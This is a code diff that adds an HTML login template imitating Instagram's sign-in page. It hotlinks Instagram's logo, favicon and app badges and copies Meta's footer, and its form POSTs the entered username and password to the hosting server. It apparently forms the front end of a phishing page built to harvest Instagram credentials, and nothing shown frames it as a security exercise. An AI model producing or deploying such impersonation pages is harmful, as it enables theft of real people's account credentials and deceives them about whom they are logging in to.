@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram • Log In</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link rel="shortcut icon" type="image/x-icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="logo">
+                <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo-img">
+            </div>
+            
+            <form method="POST">
+                <div class="form-group">
+                    <input type="text" class="form-input" name="username" id="username" required>
+                    <label for="username" class="form-label">Phone number, username, or email</label>
+                </div>
+                
+                <div class="form-group">
+                    <input type="password" class="form-input" name="password" id="password" required>
+                    <label for="password" class="form-label">Password</label>
+                </div>
+                
+                <button type="submit" class="login-button">Log In</button>
+                
+                <div class="divider">OR</div>
+                
+                <a href="#" class="fb-login">
+                    <i class="fab fa-facebook-square fb-icon"></i>
+                    Log in with Facebook
+                </a>
+                
+                <a href="#" class="forgot">Forgot password?</a>
+            </form>
+        </div>
+        
+        <div class="signup-box">
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+        </div>
+        
+        <div class="app-download">
+            <p class="app-text">Get the app.</p>
+            <div class="app-links">
+                <a href="#" class="app-link">
+                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="App Store">
+                </a>
+                <a href="#" class="app-link">
+                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Google Play">
+                </a>
+            </div>
+        </div>
+        
+        <footer>
+            <div class="footer-links">
+                <a href="#" class="footer-link">Meta</a>
+                <a href="#" class="footer-link">About</a>
+                <a href="#" class="footer-link">Blog</a>
+                <a href="#" class="footer-link">Jobs</a>
+                <a href="#" class="footer-link">Help</a>
+                <a href="#" class="footer-link">API</a>
+                <a href="#" class="footer-link">Privacy</a>
+                <a href="#" class="footer-link">Terms</a>
+                <a href="#" class="footer-link">Top Accounts</a>
+                <a href="#" class="footer-link">Hashtags</a>
+                <a href="#" class="footer-link">Locations</a>
+                <a href="#" class="footer-link">Instagram Lite</a>
+            </div>
+            <div class="copyright">
+                © 2025 Instagram from Meta
+            </div>
+        </footer>
+    </div>
+</body>
+</html>
